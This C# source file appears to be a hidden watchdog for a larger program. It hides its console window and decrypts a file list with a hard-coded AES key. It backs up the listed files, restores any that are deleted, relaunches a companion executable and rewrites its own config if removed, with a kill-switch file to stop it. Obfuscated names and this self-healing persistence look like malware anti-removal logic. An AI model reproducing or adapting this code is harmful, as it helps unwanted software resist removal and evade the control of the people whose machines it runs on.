using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;


namespace cvxDFFsV.AA
{
    class Program
    {
		private const int SW_HIDE = 0;

		public static int A = 0;

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		public static string AESDecrypt256(string Input, string key)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Key = Encoding.UTF8.GetBytes(key);
			rijndaelManaged.IV = new byte[16];
			ICryptoTransform transform = rijndaelManaged.CreateDecryptor();
			byte[] bytes = null;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
				{
					byte[] array = Convert.FromBase64String(Input);
					cryptoStream.Write(array, 0, array.Length);
				}
				bytes = memoryStream.ToArray();
			}
			return Encoding.UTF8.GetString(bytes);
		}

		private static void Main(string[] args)
		{
			IntPtr consoleWindow = GetConsoleWindow();
			ShowWindow(consoleWindow, 0);
			string text = "";
			string contents = "";
			while (true)
			{
				Thread.Sleep(1000);
				if (new FileInfo("Xcfnsjwurmfkghrnmfnsdxhjweksjdhbfksadhgfidwuy4rgoih4bew3oiwy4gbiuydxf.dlx").Exists)
				{
					File.Delete("Xcfnsjwurmfkghrnmfnsdxhjweksjdhbfksadhgfidwuy4rgoih4bew3oiwy4gbiuydxf.dlx");
					return;
				}
				if (new FileInfo("cvxDFFsVLF.dxl").Exists)
				{
					text = AESDecrypt256(File.ReadAllText("cvxDFFsVLF.dxl"), "MfCt{j8@[Y5~8;EH");
					A = 1;
					contents = File.ReadAllText("cvxDFFsVLF.dxl");
					string[] array = text.Split('#');
					for (int i = 0; i < array.Length; i++)
					{
						FileInfo fileInfo = new FileInfo(array[i]);
						if (!new DirectoryInfo("cvxDFFsvSF.dxl").Exists)
						{
							Directory.CreateDirectory("cvxDFFsvSF.dxl");
						}
						if (fileInfo.Exists)
						{
							try
							{
								File.Copy(array[i], "cvxDFFsvSF.dxl\\" + fileInfo.Name);
							}
							catch (IOException)
							{
							}
						}
						else if (new FileInfo("cvxDFFsvSF.dxl\\" + fileInfo.Name).Exists)
						{
							File.Copy("cvxDFFsvSF.dxl\\" + fileInfo.Name, array[i]);
							Process.Start("cvxDFFsV.AB.exe");
						}
					}
				}
				else
				{
					if (A != 1)
					{
						break;
					}
					File.WriteAllText("cvxDFFsVLF.dxl", contents);
				}
			}
			File.Delete("Xcfnsjwurmfkghrnmfnsdxhjweksjdhbfksadhgfidwuy4rgoih4bew3oiwy4gbiuydxf.dlx");
		}
	}
}
